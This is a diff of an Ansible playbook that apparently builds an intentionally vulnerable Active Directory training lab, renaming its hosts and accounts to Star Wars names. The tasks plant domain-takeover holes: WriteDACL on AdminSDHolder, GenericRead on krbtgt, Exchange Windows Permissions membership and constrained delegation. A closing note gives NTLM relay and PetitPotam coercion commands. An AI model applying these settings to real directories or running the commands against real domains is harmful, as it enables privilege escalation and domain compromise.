@@ -1,15 +1,15 @@
 ---
 # ==============================================================================
 # vuln_df_ext/tasks/forest_attacks.yml
-# Target: dc01.corp.local
+# Target: coruscant.empire.local
 #
 # DF-005   DsAddSidHistory right to developer2
 # DF-011   Print Spooler on all DCs (coercion)
 # DF-012   SID filtering disabled on forest trust (PAC validation bypass)
 # DF-015   Exchange Windows Permissions group with WriteDACL on domain NC
-# DF-017   AdminSDHolder WriteDACL for svc_darryl
-# DF-020   Constrained delegation on dc01 (SMTP SPN)
-# DF-022   Readable ACL on krbtgt by svc_darryl
+# DF-017   AdminSDHolder WriteDACL for svc_bobafett
+# DF-020   Constrained delegation on coruscant (SMTP SPN)
+# DF-022   Readable ACL on krbtgt by svc_bobafett
 # DF-025   Schema Admins with non-DA member (schema_admin_svc)
 # DF-030   Cross-forest NTLM relay note
 # ==============================================================================
@@ -125,30 +125,30 @@
   changed_when: "'changed:' in df015_acl_set.stdout"
   failed_when: df015_acl_set.rc != 0
 
-- name: DF-015 - Add svc_darryl to Exchange Windows Permissions
+- name: DF-015 - Add svc_bobafett to Exchange Windows Permissions
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     $members = (Get-ADGroupMember -Identity 'Exchange Windows Permissions' -ErrorAction SilentlyContinue) |
                  Select-Object -ExpandProperty SamAccountName
-    if ($members -notcontains 'svc_darryl') {
-      Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc_darryl'
-      Write-Output "changed: svc_darryl added"
+    if ($members -notcontains 'svc_bobafett') {
+      Add-ADGroupMember -Identity 'Exchange Windows Permissions' -Members 'svc_bobafett'
+      Write-Output "changed: svc_bobafett added"
     }
   register: df015_member_set
   changed_when: "'changed:' in df015_member_set.stdout"
   failed_when: df015_member_set.rc != 0
 
 # ------------------------------------------------------------------------------
-# DF-017: AdminSDHolder WriteDACL for svc_darryl.
+# DF-017: AdminSDHolder WriteDACL for svc_bobafett.
 # Any ACE on AdminSDHolder propagates to all protected accounts every ~60 mins.
 # Granting WriteDACL here eventually grants WriteDACL on DA, EA, krbtgt, etc.
 # ------------------------------------------------------------------------------
-- name: DF-017 - Grant WriteDACL on AdminSDHolder to svc_darryl
+- name: DF-017 - Grant WriteDACL on AdminSDHolder to svc_bobafett
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     try {
       $adminSDHolderDN = "CN=AdminSDHolder,CN=System,{{ ad_domain_dn }}"
-      $sid = (Get-ADUser -Identity 'svc_darryl' -ErrorAction Stop).SID
+      $sid = (Get-ADUser -Identity 'svc_bobafett' -ErrorAction Stop).SID
       $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
         $sid,
         [System.DirectoryServices.ActiveDirectoryRights]::WriteDacl,
@@ -157,7 +157,7 @@
       $obj = [ADSI]"LDAP://$adminSDHolderDN"
       $obj.ObjectSecurity.AddAccessRule($ace)
       $obj.CommitChanges()
-      Write-Output "changed: WriteDACL on AdminSDHolder granted to svc_darryl"
+      Write-Output "changed: WriteDACL on AdminSDHolder granted to svc_bobafett"
     } catch {
       Write-Output "WARN: $($_.Exception.Message)"
     }
@@ -166,16 +166,16 @@
   failed_when: df017_set.rc != 0
 
 # ------------------------------------------------------------------------------
-# DF-020: Constrained delegation on dc01 (SMTP SPN).
-# dc01$ has msDS-AllowedToDelegateTo set to SMTP/dc01.corp.local.
+# DF-020: Constrained delegation on coruscant (SMTP SPN).
+# coruscant$ has msDS-AllowedToDelegateTo set to SMTP/coruscant.empire.local.
 # Combined with S4U2Self, attacker impersonates any user to SMTP service.
 # ------------------------------------------------------------------------------
-- name: DF-020 - Check msDS-AllowedToDelegateTo on dc01
+- name: DF-020 - Check msDS-AllowedToDelegateTo on coruscant
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    $dc = Get-ADComputer -Identity 'dc01' `
+    $dc = Get-ADComputer -Identity 'coruscant' `
             -Properties 'msDS-AllowedToDelegateTo' -ErrorAction SilentlyContinue
-    if ($dc.'msDS-AllowedToDelegateTo' -contains 'SMTP/dc01.corp.local') {
+    if ($dc.'msDS-AllowedToDelegateTo' -contains 'SMTP/coruscant.empire.local') {
       Write-Output "present"
     } else {
       Write-Output "absent"
@@ -184,29 +184,29 @@
   changed_when: false
   failed_when: df020_check.rc != 0
 
-- name: DF-020 - Set SMTP constrained delegation on dc01
+- name: DF-020 - Set SMTP constrained delegation on coruscant
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
-    Set-ADComputer -Identity 'dc01' `
-      -Add @{'msDS-AllowedToDelegateTo' = 'SMTP/dc01.corp.local'} -ErrorAction Stop
-    Set-ADAccountControl -Identity 'dc01$' -TrustedToAuthForDelegation $true
-    Write-Output "changed: SMTP delegation set on dc01"
+    Set-ADComputer -Identity 'coruscant' `
+      -Add @{'msDS-AllowedToDelegateTo' = 'SMTP/coruscant.empire.local'} -ErrorAction Stop
+    Set-ADAccountControl -Identity 'coruscant$' -TrustedToAuthForDelegation $true
+    Write-Output "changed: SMTP delegation set on coruscant"
   register: df020_set
   changed_when: "'changed:' in df020_set.stdout"
   failed_when: df020_set.rc != 0
   when: "'absent' in df020_check.stdout"
 
 # ------------------------------------------------------------------------------
-# DF-022: Readable ACL on krbtgt account for svc_darryl.
+# DF-022: Readable ACL on krbtgt account for svc_bobafett.
 # GenericRead on krbtgt allows reading password last set date and SID history —
 # useful for Golden Ticket timing attacks.
 # ------------------------------------------------------------------------------
-- name: DF-022 - Grant GenericRead on krbtgt to svc_darryl
+- name: DF-022 - Grant GenericRead on krbtgt to svc_bobafett
   ansible.windows.win_shell: |
     Import-Module ActiveDirectory
     try {
       $krbtgt = Get-ADUser -Identity 'krbtgt' -ErrorAction Stop
-      $sid    = (Get-ADUser -Identity 'svc_darryl' -ErrorAction Stop).SID
+      $sid    = (Get-ADUser -Identity 'svc_bobafett' -ErrorAction Stop).SID
       $ace = New-Object System.DirectoryServices.ActiveDirectoryAccessRule(
         $sid,
         [System.DirectoryServices.ActiveDirectoryRights]::GenericRead,
@@ -215,7 +215,7 @@
       $obj = [ADSI]"LDAP://$($krbtgt.DistinguishedName)"
       $obj.ObjectSecurity.AddAccessRule($ace)
       $obj.CommitChanges()
-      Write-Output "changed: GenericRead on krbtgt granted to svc_darryl"
+      Write-Output "changed: GenericRead on krbtgt granted to svc_bobafett"
     } catch {
       Write-Output "WARN: $($_.Exception.Message)"
     }
@@ -262,14 +262,14 @@
       DF-030: Cross-Forest NTLM Relay Attack
       ========================================
       Setup in this lab:
-        - corp.local ←→ finance.local: external trust, SID filtering disabled
-        - corp.local ←→ root.corp: tree-root trust, SID filtering disabled
+        - empire.local ←→ rebel.local: external trust, SID filtering disabled
+        - empire.local ←→ trade.corp: tree-root trust, SID filtering disabled
 
       Attack path:
-        1. Coerce corp.local DC (dc01) to authenticate via PetitPotam/PrinterBug to attacker
-        2. Relay NTLM auth to finance.local resources (SMB/LDAP signing disabled)
-        3. SID filtering off → corp.local DA SID accepted in finance.local PAC
+        1. Coerce empire.local DC (coruscant) to authenticate via PetitPotam/PrinterBug to attacker
+        2. Relay NTLM auth to rebel.local resources (SMB/LDAP signing disabled)
+        3. SID filtering off → empire.local DA SID accepted in rebel.local PAC
 
       Tools:
-        Responder + ntlmrelayx.py --target ldap://dc01.finance.local --escalate-user svc_darryl
-        impacket-PetitPotam attacker_ip dc01.corp.local
+        Responder + ntlmrelayx.py --target ldap://yavin4.rebel.local --escalate-user svc_bobafett
+        impacket-PetitPotam attacker_ip coruscant.empire.local
